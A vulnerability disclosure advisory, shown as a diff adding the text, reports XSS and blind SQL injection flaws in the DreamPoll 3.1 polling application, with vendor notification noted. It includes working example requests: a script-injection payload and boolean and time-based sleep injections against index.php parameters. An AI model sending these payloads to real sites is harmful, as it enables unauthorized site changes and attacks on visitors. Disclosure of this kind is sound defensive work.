@@ -1,0 +1,38 @@
+During a recent security audit of the DreamPoll 3.1 software by Dreamlevels, I discovered a number of XSS and SQL Injection vulnerabilities in the application. These vulnerabilities could be exploited to make unauthorized changes to a web site or compromise a client accessing a site that utilizes the application. Details of the vulnerabilities are as follows:
+
+XSS
+
+????????-
+
+File: index.php
+
+Variable: recordsPerPage
+
+Example: GET /index.php?action=loginsortField=poll_default&sortDesc=1&recordsPerPage=
+1>?><ScRiPt%20%0d%0a>alert(911)%3B</ScRiPt>
+
+Blind SQL/Xpath Injection
+
+????????-
+
+File: index.php
+
+Variable: sortField
+
+Example: GET /index.php?action=loginsortField=poll_default+and+31337-31337=0&sortDesc
+=1&recordsPerPage=20
+
+Blind SQL Injection (Timing)
+
+????????-
+
+File: index.php
+
+Variables: sortField, sortDesc, pageNumber
+
+Example: GET /index.php?action=loginsortField=poll_default+and+sleep(3)%23&sortDesc=1
+&recordsPerPage=20
+
+While not specifically tested, it is likely these vulnerabilities exist in earlier versions of this application as well. The vendor was notified on 09/28/2009 and a fix was released the same day. If you are a current user of this software, contact the vendor for the available fix.
+
+http://www.infosecstuff.com
